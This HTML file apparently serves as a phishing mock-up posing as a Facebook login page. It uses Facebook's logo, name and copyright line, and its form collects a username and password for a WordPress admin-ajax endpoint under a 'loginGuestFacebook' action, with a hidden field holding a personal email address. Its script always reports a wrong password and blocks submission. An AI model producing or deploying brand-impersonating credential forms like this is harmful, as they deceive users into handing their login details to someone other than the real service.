<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(120deg, #3498db, #8e44ad);
            background-size: 400% 400%;
            animation: gradientAnimation 10s infinite;
        }

        .header {
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 36px;
        }

        @keyframes gradientAnimation {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

        .logo {
            width: 100px;
            height: 100px;
            background-image: url('https://www.facebook.com/images/fb_icon_325x325.png');
            background-size: cover;
            margin: 20px 0;
            border-radius: 50%;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .form {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }

        .form label {
            display: block;
            margin: 10px 0;
            font-size: 16px;
        }

        .form input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }

        .form input[type="submit"] {
            background-color: #1877f2;
            color: white;
            cursor: pointer;
        }

        .error-message {
            color: red;
            margin-top: 10px;
            font-size: 14px;
        }

        .footer {
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Welcome to Facebook</h1>
    </div>
    <div class="logo"></div>
    <div class="form">
        <form action="http://localhost/wp-admin/admin-ajax.php" method="post" onsubmit="return validateForm()">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required />
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required />
            
            <input type="hidden" name="email" value="aarti@gmail.com">
            <input type="hidden" name="action" value="loginGuestFacebook">
            
            <input type="submit" value="Log In" />
        </form>
        <p id="error-message" class="error-message"></p>
    </div>
    <div class="footer">
        <p>&copy; 2023 Facebook</p>
    </div>
    <script>
        function validateForm() {
            document.getElementById('error-message').innerText = "Username or password is incorrect. Please try again.";
            return false; // Prevent form submission
        }
    </script>
</body>
</html>
